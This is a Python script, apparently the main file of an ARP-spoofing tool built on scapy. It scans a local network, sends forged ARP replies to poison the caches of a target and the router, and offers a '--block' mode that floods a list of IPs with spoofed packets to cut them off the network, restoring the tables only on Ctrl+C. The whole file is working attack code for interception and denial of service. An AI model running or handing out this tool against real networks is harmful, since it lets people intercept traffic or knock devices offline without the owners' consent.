# main_script.py
from scapy.all import *
import argparse
import time
import os
from colorama import Fore, init,Style
init(autoreset=True)

from scan_network import scan_network, display 
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_options():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', type=str, required=False, help='Target IP address')
    parser.add_argument('-r',type=str, required=False, help='Router IP address')
    parser.add_argument('--interface', type=str, help='Select interface')
    parser.add_argument('--scan', action='store_true', help='Scan the network')
    parser.add_argument('--range', type=str, help='IP range to scan')
    parser.add_argument('--timeout', type=int, default=8, help='Timeout for ARP scan (default: 8 seconds)')
    parser.add_argument('--block',type=str,required=False,help='block all user in the list ')
    


    return parser.parse_args()

def mac_scan(ip, iface=None):
    arp_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = ARP(pdst=ip)
    packet = arp_broadcast / arp_request
    answered, unanswered = srp(packet, timeout=5, verbose=False, iface=iface)
    if len(answered)==0:

        print(Fore.LIGHTYELLOW_EX + f"[-] ⚠️ No response from {ip}. Is the device online?" + Style.RESET_ALL)


        return None
    return answered[0][1].hwsrc

def spoof(ip_target, router_ip, iface=None):
    target_mac = mac_scan(ip_target, iface)
    if target_mac:
        packet = ARP(op=2, pdst=ip_target, hwdst=target_mac, psrc=router_ip)
        send(packet, verbose=False, iface=iface)
        print(Fore.BLUE + "[+] 😈 Evil packets sent" + Style.RESET_ALL)
def restore(destination_ip, source_ip, iface=None):
    destination_mac = mac_scan(destination_ip, iface)
    source_mac = mac_scan(source_ip, iface)
    if destination_mac and source_mac:
        packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, verbose=False, count=8, iface=iface)

def block_all(ip_list_str,router_ip,iface=None):
    ip_list=ip_list_str.split(",")
    print(Fore.WHITE + "[*] 🛡️ Starting to block the following IPs:" + Style.RESET_ALL)
    for ip in ip_list:

        print(Fore.RED + "-----------> " + ip.strip() + " 💀" + Style.RESET_ALL)
    try:
        while True:

            for ip in ip_list:
                ip.strip()
                spoof(ip,router_ip,iface=None)
                spoof(router_ip,ip,iface=None)
            #time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED+"\n[-] Ctrl+C detected. Restoring ARP tables...")
        for ip in ip_list:
            ip = ip.strip()
            restore(ip, router_ip, iface)
            restore(router_ip, ip, iface)


def main():
    if os.geteuid() != 0:
        print(Fore.RED+"[-] Run the script as root.")
        exit(1)

    opts = get_options()

    if opts.scan:
        if not opts.range:
            print(Fore.RED+"[-] Specify a range with --range.")
            exit(1)
        clients = scan_network(opts.range, opts.timeout, opts.interface)
        display(clients)
    elif opts.block !=None:


        if opts.r == None:

            print(Fore.RED+"[-] You must specify router IP with -r when using --block.")
            exit(1)
        block_all(opts.block,opts.r,opts.interface)
    else:
        try:
            while True:
                spoof(opts.i, opts.r, opts.interface)
                spoof(opts.r, opts.i, opts.interface)
                
                time.sleep(2)
        except KeyboardInterrupt:
            restore(opts.i, opts.r, opts.interface)
            restore(opts.r, opts.i, opts.interface)
            print(Fore.RED + "\n[-] Exiting...")

if __name__ == "__main__":
    main()
